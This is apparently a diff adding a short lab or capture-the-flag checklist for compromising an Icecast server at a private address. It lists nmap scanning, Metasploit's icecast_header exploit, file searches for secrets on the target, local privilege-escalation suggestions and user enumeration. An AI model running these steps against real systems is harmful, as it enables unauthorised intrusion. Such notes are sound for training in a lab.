@@ -1,0 +1,17 @@
+1. nmap -T4 -A -vv 192.168.0.20 -o icecast.nmap
+2. searchsploit icecast
+3. msfconsole
+4a. search icecast 
+4b. use exploit/windows/http/icecast_header
+5. set RHOST 192.168.0.20 
+6a. exploit
+6b. search -d / -f *secret* -r 
+7. search -d / -f *recipe* -r
+8. run post/multi/recon/local_exploit_suggester 
+    exploit/windows/local/ikeext_service
+    exploit/windows/local/ms16_075_reflection
+Bonus:
+1. run post/windows/gather/enum_logged_on_users 
+2. sysinfo
+3. Start a windows term and run `systeminfo`
+
